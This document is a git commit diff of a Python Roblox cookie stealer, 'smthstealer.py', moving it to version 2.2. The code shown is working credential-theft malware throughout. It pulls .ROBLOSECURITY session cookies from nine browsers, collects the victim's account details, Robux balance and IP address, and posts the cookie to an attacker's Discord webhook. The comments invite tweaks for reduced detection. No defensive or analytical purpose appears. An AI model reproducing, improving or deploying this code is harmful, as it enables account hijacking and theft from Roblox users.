5d168453ac4930c53f3fc00fa779fb1f78b598dc
something.py <shawnlunsfordjr@gmail.com>
2023-07-16 05:43:57 -0400

    2.2.0

--- smthstealer.py
+++ smthstealer.py
@@ -1,121 +1,149 @@
-webhook = ""
+## Replace Webhook on Line 149
+## This is not meant to be undetected, make any changes you see fit for any performance boosts or reduced-detections, but, this is just a simple implementation of what is otherwise a dualhooked cookie grabber
+## Enjoy!
 
 try:
-    import robloxpy
-    import requests
-    import browser_cookie3
+    import robloxpy, requests, browser_cookie3
+except Exception as e:
+    print(str(e)[16:].replace("'", "") + ' is not installed, run install.bat first.'), exit()
 
-except:
-    input("One of the packages are not installed, run 'install.bat' before using this.")
-    exit()
-
-
-
+class SMTHGRB:
+    def __init__(self, webhook: str):
+        if not "discord.com/api/webhooks/" in webhook:
+            print('You did not provide a webhook on Line 149.'), exit()
 
 
-def cookiecheckerandsend(cookie, platform):
-    ## In the original version, from Mani175, he did not account for the fact there could be multiple cookies, and only accessed the value once.
-    ## In this, it will grab *all* cookies from the platforms that are specified to run this function. Modify them however you see fit.
-    if not robloxpy.Utils.CheckCookie(cookie) == "Valid Cookie":
-        return requests.post(url=webhook, data={"content":f"Dead Cookie\n|| ```{cookie}``` ||"})
+        self.webhook = webhook
+        self.cookie = None
+        self.platform = None
 
-    info = requests.get("https://www.roblox.com/mobileapi/userinfo",cookies={".ROBLOSECURITY":cookie}).json()
+        self.browsers()
+
+    def checker(self):
+        if not robloxpy.Utils.CheckCookie(self.cookie) == "Valid Cookie":
+            return requests.post(url=self.webhook, data={'content': f'Found a dead cookie on {self.platform}{" - Continuing." if self.platform != "Librewolf" else ""}'})
+        
+        user = requests.get("https://www.roblox.com/mobileapi/userinfo",cookies={".ROBLOSECURITY":self.cookie}).json()
+        id = user['UserID']
+
+        self.info = f"Username: **{user['UserName']}**\nRobux: **R${int(user['RobuxBalance']):,}**\nPremium: **{user['IsPremium']}**\nCreated: **{robloxpy.User.External.CreationDate(id, 1)}** (*{int(robloxpy.User.External.GetAge(id)):,} days ago*)\nRAP: **{int(robloxpy.User.External.GetRAP(id)):,}**\nFriends: **{int(robloxpy.User.Friends.External.GetCount(id)):,}**\n\nIP Address: ||**{requests.get('https://api.ipify.org/').text}**||\n\nCookie:\n||```fix\n{self.cookie}```||"
+
+        self.send()
+        
 
 
-    rid = info["UserID"]
-    username = info['UserName']
-    robux = int(info['RobuxBalance'])
-    premium = info['IsPremium']
-    rap = int(robloxpy.User.External.GetRAP(rid))
-    friends = int(robloxpy.User.Friends.External.GetCount(rid))
-    age = int(robloxpy.User.External.GetAge(rid))
-    crdate = robloxpy.User.External.CreationDate(rid, 1)
-    requests.post(webhook, json={
-        "username": "ꜱᴏᴍᴇᴛʜɪɴɢ's Roblox Cookie Grabber",
-        "embeds": 
-        [
-            {
-                "title": f"🕯 Valid Account - {platform}",
-                "description" : f"[Github Page](https://github.com/something23-0001/-s-Cookie-Grabber) | [Rolimons](https://www.rolimons.com/player/{rid}) | [Roblox Profile](https://web.roblox.com/users/{rid}/profile)\n\nUsername: **{username}**\nRobux: **R${robux:,}**\nPremium: **{premium}**\nCreated: **{crdate}** (*{age:,} days ago*)\nRAP: **{rap:,}**\nFriends: **{friends:,}**\n\nIP Address: **{requests.get('https://api.ipify.org/').text}**\n\nCookie:\n```fix\n{cookie}```",   
-                "color" : 12452044,
-                "footer": {
-                    "text": "V2.1 | Forked from Mani175's Pirate-Cookie-Grabber"
+    def browsers(self):
+
+        
+
+        try:
+            self.platform = "Firefox"
+            for cookie in browser_cookie3.firefox(domain_name='roblox.com'):
+                if cookie.name == '.ROBLOSECURITY':
+                    self.cookie = cookie.value
+                    self.checker()
+
+        except:
+            pass
+
+        
+        try:
+            self.platform = "Safari"
+            for cookie in browser_cookie3.safari(domain_name='roblox.com'):
+                if cookie.name == '.ROBLOSECURITY':
+                    self.cookie = cookie.value
+                    self.checker()
+
+        except:
+            pass
+
+        try:
+            self.platform = "Chromium"
+            for cookie in browser_cookie3.chromium(domain_name='roblox.com'):
+                if cookie.name == '.ROBLOSECURITY':
+                    self.cookie = cookie.value
+                    self.checker()
+
+        except:
+            pass
+
+        try:
+            self.platform = "Edge"
+            for cookie in browser_cookie3.edge(domain_name='roblox.com'):
+                if cookie.name == '.ROBLOSECURITY':
+                    self.cookie = cookie.value
+                    self.checker()
+
+
+        except:
+            pass
+
+        try:
+            self.platform = "Opera GX"
+            for cookie in browser_cookie3.opera_gx(domain_name='roblox.com'):
+                if cookie.name == '.ROBLOSECURITY':
+                    self.cookie = cookie.value
+                    self.checker()
+
+        except:
+            pass
+        
+        try:
+            self.platform = "Opera" ## Who the fuck uses Opera LMAO
+            for cookie in browser_cookie3.opera(domain_name='roblox.com'):
+                if cookie.name == '.ROBLOSECURITY':
+                    self.cookie = cookie.value
+                    self.checker()
+
+        except:
+            pass
+
+        try:
+            self.platform = "Brave"
+            for cookie in browser_cookie3.brave(domain_name='roblox.com'):
+                if cookie.name == '.ROBLOSECURITY':
+                    self.cookie = cookie.value
+                    self.checker()
+
+        except:
+            pass
+
+        try:
+            self.platform = "Chrome"
+            for cookie in browser_cookie3.chrome(domain_name='roblox.com'):
+                if cookie.name == '.ROBLOSECURITY':
+                    self.cookie = cookie.value
+                    self.checker()
+
+        except:
+            pass
+
+        try:
+            self.platform = "Librewolf"
+            for cookie in browser_cookie3.librewolf(domain_name='roblox.com'):
+                if cookie.name == '.ROBLOSECURITY':
+                    self.cookie = cookie.value
+                    self.checker()
+
+        except:
+            pass
+
+        
+
+    def send(self):
+        x = requests.post(self.webhook, json={
+            "username": "ꜱᴏᴍᴇᴛʜɪɴɢ's .ROBLOSECURITY Grabber",
+            "embeds": [
+                {
+                    "title": f"✔ Valid Account - {self.platform}",
+                    "description": self.info,
+                    "color": 12452044,
+                    "footer": {
+                        "text": "v2.2 ; Forked from Mani175's Cookie Grabber"
+                    }
                 }
-            }
-        ]
-    })
+            ]
+        })
 
 
-    
-    
-
-
-
-def cookieLogger():
-
-    
-    try:
-        cookies = browser_cookie3.firefox(domain_name='roblox.com')
-        for cookie in cookies:
-            if cookie.name == '.ROBLOSECURITY':
-                cookiecheckerandsend(cookie.value, platform='Firefox')
-    except:
-        pass
-
-    try:
-        cookies = browser_cookie3.safari(domain_name='roblox.com')
-        for cookie in cookies:
-            if cookie.name == '.ROBLOSECURITY':
-                cookiecheckerandsend(cookie.value, platform='Safari')
-    except:
-        pass
-
-    try:
-        cookies = browser_cookie3.chromium(domain_name='roblox.com')
-        for cookie in cookies:
-            if cookie.name == '.ROBLOSECURITY':
-                cookiecheckerandsend(cookie.value, platform='Chromium')
-    except:
-        pass
-
-    try:
-        cookies = browser_cookie3.edge(domain_name='roblox.com')
-        for cookie in cookies:
-            if cookie.name == '.ROBLOSECURITY':
-                cookiecheckerandsend(cookie.value, platform='Microsoft Edge')
-    except:
-        pass
-
-    try:
-        cookies = browser_cookie3.opera_gx(domain_name='roblox.com')
-        for cookie in cookies:
-            if cookie.name == '.ROBLOSECURITY':
-                cookiecheckerandsend(cookie.value, platform='Opera GX')
-    except:
-        pass
-
-    try:
-        cookies = browser_cookie3.opera(domain_name='roblox.com')
-        for cookie in cookies:
-            if cookie.name == '.ROBLOSECURITY':
-                cookiecheckerandsend(cookie.value, platform='Opera')
-    except:
-        pass
-
-    try:
-        cookies = browser_cookie3.brave(domain_name='roblox.com')
-        for cookie in cookies:
-            if cookie.name == '.ROBLOSECURITY':
-                cookiecheckerandsend(cookie.value, platform='Brave')
-    except:
-        pass
-
-    try:
-        cookies = browser_cookie3.chrome(domain_name='roblox.com')
-        for cookie in cookies:
-            if cookie.name == '.ROBLOSECURITY':
-                cookiecheckerandsend(cookie.value, platform='Chrome')
-    except:
-        pass
-
-cookies = cookieLogger()
+SMTHGRB("%REPLACEWEBHOOK%")
